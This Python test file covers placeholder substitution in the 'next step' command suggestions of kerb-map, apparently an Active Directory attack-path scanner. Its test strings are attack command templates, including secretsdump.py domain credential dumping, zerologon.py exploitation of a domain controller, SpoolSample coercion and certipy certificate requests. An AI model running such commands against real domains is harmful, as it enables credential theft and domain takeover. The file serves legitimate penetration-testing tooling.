"""Placeholder substitution in next_step strings (brief §3.5).

Pins the substitution contract: which placeholders get replaced (the
ones knowable at scan time) and which stay literal (operator-supplied).
A change here that drops a substitution would silently re-introduce
the "copy-paste then edit by hand" UX wart the brief was complaining
about, so the contract is locked test-side.
"""

from kerb_map.plugin import Finding
from kerb_map.substitute import (
    SubstitutionContext,
    apply_to_finding,
    apply_to_findings,
    substitute,
)


def _ctx(**kw):
    return SubstitutionContext(
        dc_ip="10.0.0.1",
        domain="CORP.LOCAL",
        domain_sid="S-1-5-21-1-2-3",
        dc_fqdn="dc01.corp.local",
        base_dn="DC=corp,DC=local",
        **kw,
    )


# ────────────────────────────────────────── known substitutions ──


def test_dc_ip_substituted():
    out = substitute("certipy req -dc-ip <DC_IP>", _ctx())
    assert out == "certipy req -dc-ip 10.0.0.1"


def test_domain_uppercase_substituted():
    out = substitute("kinit user@<DOMAIN>", _ctx())
    assert out == "kinit user@CORP.LOCAL"


def test_domain_lowercase_substituted_separately():
    """The two spellings are different placeholders so operators can
    pick the rendered case — kinit wants UPPER, ldapsearch wants lower."""
    out = substitute("ldapsearch -h dc.<domain>", _ctx())
    assert out == "ldapsearch -h dc.corp.local"


def test_domain_sid_substituted():
    out = substitute("getTGT.py -domain-sid <DOMAIN_SID>", _ctx())
    assert out == "getTGT.py -domain-sid S-1-5-21-1-2-3"


def test_dc_fqdn_substituted():
    out = substitute("getST.py -spn cifs/<DC_FQDN>", _ctx())
    assert out == "getST.py -spn cifs/dc01.corp.local"


def test_dc_hostname_alias_for_fqdn():
    """Some recipes use <DC_HOSTNAME> instead of <DC_FQDN> — both should
    render the same value so we don't trip the operator on cosmetic
    placeholder choice."""
    out = substitute("SpoolSample.exe <DC_HOSTNAME> attacker", _ctx())
    assert out == "SpoolSample.exe dc01.corp.local attacker"


def test_dc_name_derived_from_fqdn():
    """<DC_NAME> = NetBIOS-style short name, uppercase. Used by
    ZeroLogon / Certifried recipes that want the bare hostname."""
    out = substitute("python3 zerologon.py <DC_NAME>", _ctx())
    assert out == "python3 zerologon.py DC01"


def test_base_dn_substituted():
    out = substitute("ldapsearch -b '<BASE>' '(objectClass=user)'", _ctx())
    assert out == "ldapsearch -b 'DC=corp,DC=local' '(objectClass=user)'"


def test_multiple_placeholders_in_one_string():
    out = substitute(
        "secretsdump.py -no-pass -just-dc <DOMAIN>/<DC_NAME>$@<DC_IP>",
        _ctx(),
    )
    assert out == "secretsdump.py -no-pass -just-dc CORP.LOCAL/DC01$@10.0.0.1"


# ────────────────────────────────────────── operator-supplied stay literal ─


def test_operator_placeholders_unchanged():
    """<pass>, <ATTACKER_IP>, <victim>, etc. require operator input or
    output from another tool — substituting them would be lying about
    what kerb-map knows."""
    text = (
        "certipy req -u <victim>@<DOMAIN> -p <pass> "
        "-target <ATTACKER_IP> -ca <CA> -template <TPL>"
    )
    out = substitute(text, _ctx())
    # <DOMAIN> got substituted; the rest stayed literal.
    assert "<victim>" in out
    assert "<pass>"   in out
    assert "<ATTACKER_IP>" in out
    assert "<CA>"     in out
    assert "<TPL>"    in out
    assert "CORP.LOCAL" in out


def test_unknown_placeholder_left_alone():
    """A placeholder we don't recognise (e.g. <SOMETHING_NEW>) is left
    intact — better visible-and-broken than silently-wrong."""
    out = substitute("foo <SOMETHING_NEW> bar <DC_IP>", _ctx())
    assert "<SOMETHING_NEW>" in out
    assert "10.0.0.1" in out


# ────────────────────────────────────────── unknowns / safety ────


def test_none_input_passes_through():
    """Some Findings have no next_step — substitute() must not crash."""
    assert substitute(None, _ctx()) is None


def test_empty_input_passes_through():
    assert substitute("", _ctx()) == ""


def test_unknown_value_leaves_placeholder_intact():
    """When the scan didn't capture e.g. domain_sid, the placeholder
    must stay so the operator knows they need to fill it in — silent
    deletion is the worst possible outcome."""
    ctx = SubstitutionContext(
        dc_ip="10.0.0.1",
        domain="CORP.LOCAL",
        domain_sid=None,         # not captured
        dc_fqdn=None,            # not captured
        base_dn="DC=corp,DC=local",
    )
    out = substitute(
        "getTGT -domain-sid <DOMAIN_SID> -dc <DC_FQDN> -ip <DC_IP>",
        ctx,
    )
    assert "<DOMAIN_SID>" in out
    assert "<DC_FQDN>"    in out
    assert "10.0.0.1"     in out


def test_dc_name_unknown_when_no_fqdn():
    """No FQDN → no derivable short name. Don't invent one."""
    ctx = SubstitutionContext(domain="CORP.LOCAL", dc_ip="10.0.0.1")
    out = substitute("zerologon <DC_NAME>", ctx)
    assert out == "zerologon <DC_NAME>"


def test_dc_name_uppercased_from_lowercase_fqdn():
    """The NetBIOS short name is uppercase by convention even when the
    DNS name is lowercase. ZeroLogon and similar tools expect upper."""
    ctx = SubstitutionContext(dc_fqdn="domctrl.example.org")
    assert ctx.dc_name == "DOMCTRL"


# ────────────────────────────────────────── apply_to_finding ─────


def test_apply_to_finding_mutates_next_step_in_place():
    f = Finding(
        target="DC", attack="CVE-2020-1472", severity="CRITICAL",
        priority=99, reason="...",
        next_step="zerologon <DC_NAME> <DC_IP>",
    )
    apply_to_finding(f, _ctx())
    assert f.next_step == "zerologon DC01 10.0.0.1"


def test_apply_to_finding_handles_dict_shape():
    """The unified scorer.targets list is a list of plain dicts, not
    Finding objects — same helper must handle both."""
    d = {"target": "x", "next_step": "ldapsearch -b '<BASE>'"}
    apply_to_finding(d, _ctx())
    assert d["next_step"] == "ldapsearch -b 'DC=corp,DC=local'"


def test_apply_to_finding_skips_objects_without_next_step():
    """A Finding with no next_step (some inventory findings) must not
    crash the substitution pass."""
    f = Finding(target="x", attack="info", severity="INFO",
                priority=10, reason="seen")
    f.next_step = ""
    apply_to_finding(f, _ctx())
    assert f.next_step == ""


def test_apply_to_findings_walks_the_iterable():
    findings = [
        Finding(target="a", attack="x", severity="HIGH", priority=80,
                reason="...", next_step="ping <DC_IP>"),
        Finding(target="b", attack="y", severity="HIGH", priority=80,
                reason="...", next_step="kinit user@<DOMAIN>"),
    ]
    apply_to_findings(findings, _ctx())
    assert findings[0].next_step == "ping 10.0.0.1"
    assert findings[1].next_step == "kinit user@CORP.LOCAL"


def test_apply_to_findings_handles_none_or_empty():
    """Defensive: scorer might pass [] or None. Don't blow up."""
    apply_to_findings([], _ctx())
    apply_to_findings(None, _ctx())   # tolerated: None iterable is a no-op
